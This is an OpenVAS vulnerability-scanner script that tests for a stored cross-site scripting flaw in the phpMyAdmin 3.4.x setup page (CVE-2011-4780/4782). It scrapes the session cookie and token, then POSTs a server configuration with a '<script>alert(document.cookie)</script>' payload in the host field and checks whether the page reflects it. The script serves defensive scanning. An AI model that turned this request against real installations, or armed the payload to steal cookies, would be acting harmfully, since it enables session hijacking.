###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_phpmyadmin_setup_host_var_xss_vuln.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# phpMyAdmin Setup '$host' Variable Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:phpmyadmin:phpmyadmin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902802");
  script_version("$Revision: 13660 $");
  script_cve_id("CVE-2011-4780", "CVE-2011-4782");
  script_bugtraq_id(51166);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-12-23 12:12:12 +0530 (Fri, 23 Dec 2011)");
  script_name("phpMyAdmin Setup '$host' Variable Cross Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/47338");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108110/TWSL2011-019.txt");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2011-19.php");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2011-20.php");
  script_xref(name:"URL", value:"https://www.trustwave.com/spiderlabs/advisories/TWSL2011-019.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_phpmyadmin_detect_900129.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpMyAdmin/installed");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.");
  script_tag(name:"affected", value:"phpMyAdmin versions 3.4.x before 3.4.9");
  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input via
  the '$host' variable within the setup, which allows attackers to execute
  arbitrary HTML and script code in a user's browser session in the context
  of an affected site.");
  script_tag(name:"solution", value:"Upgrade to phpMyAdmin version 3.4.9 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"The host is running phpMyAdmin and is prone to cross site scripting
  vulnerability.");
  script_xref(name:"URL", value:"http://www.phpmyadmin.net/home_page/downloads.php");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

host = http_host_name(port:port);

url = "/setup/index.php?tab_hash=&check_page_refresh=1&page=servers&mode=add&submit=New+server";
req = http_get(item:dir + url, port:port);
res = http_keepalive_send_recv(port:port, data:req);

cookie = eregmatch(pattern:"Set-Cookie: ([^;]*);", string:res);
if(isnull(cookie[1])) {
  exit(0);
}
cookie = cookie[1];

token = eregmatch(pattern:'name="token" value="([a-zA-Z0-9]+)"', string:res);
if(isnull(token[1])) {
  exit(0);
}
token = token[1];

data = string(
           "tab_hash=&check_page_refresh=1&token=",token,"&Servers-0-verb",
           "ose=&Servers-0-host=<script>alert(document.cookie)</script>&S",
           "ervers-0-port=&Servers-0-socket=&Servers-0-connect_type=tcp&S",
           "ervers-0-extension=mysqli&submit_save=Save&Servers-0-auth_typ",
           "e=cookie&Servers-0-user=root&Servers-0-password=&Servers-0-au",
           "th_swekey_config=&Servers-0-auth_http_realm=&Servers-0-Signon",
           "Session=&Servers-0-SignonURL=&Servers-0-LogoutURL=&Servers-0-",
           "only_db=&Servers-0-only_db-userprefs-allow=on&Servers-0-hide_",
           "db=&Servers-0-hide_db-userprefs-allow=on&Servers-0-AllowRoot=",
           "on&Servers-0-DisableIS=on&Servers-0-AllowDeny-order=&Servers-",
           "0-AllowDeny-rules=&Servers-0-ShowDatabasesCommand=SHOW+DATABA",
           "SES&Servers-0-pmadb=&Servers-0-controluser=&Servers-0-control",
           "pass=&Servers-0-verbose_check=on&Servers-0-bookmarktable=&Ser",
           "vers-0-relation=&Servers-0-userconfig=&Servers-0-table_info=&",
           "Servers-0-column_info=&Servers-0-history=&Servers-0-tracking=",
           "&Servers-0-table_coords=&Servers-0-pdf_pages=&Servers-0-desig",
           "ner_coords=&Servers-0-tracking_default_statements=CREATE+TABL",
           "E%2CALTER+TABLE%2CDROP+TABLE%2CRENAME+TABLE%2CCREATE+INDEX%2C",
           "DROP+INDEX%2CINSERT%2CUPDATE%2CDELETE%2CTRUNCATE%2CREPLACE%2C",
           "CREATE+VIEW%2CALTER+VIEW%2CDROP+VIEW%2CCREATE+DATABASE%2CALTE",
           "R+DATABASE%2CDROP+DATABASE&Servers-0-tracking_add_drop_view=o",
           "n&Servers-0-tracking_add_drop_table=on&Servers-0-tracking_add",
           "_drop_database=on");

url = string(dir, '/setup/index.php?tab_hash=&check_page_refresh=1',
             '&token=', token, '&page=servers&mode=add&submit=New+server');

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", http_get_user_agent(), "\r\n",
             "Cookie: ", cookie, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(data), "\r\n\r\n", data);
res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 30")
{
  req = http_get(item:string(dir,"/setup/index.php"), port:port);
  req = string(chomp(req), '\r\nCookie: ', cookie, '\r\n\r\n');
  res = http_keepalive_send_recv(port:port, data:req);

  if(res =~ "^HTTP/1\.[01] 200" && "Use SSL (<script>alert(document.cookie)</script>)" >< res){
    security_message(port);
  }
}
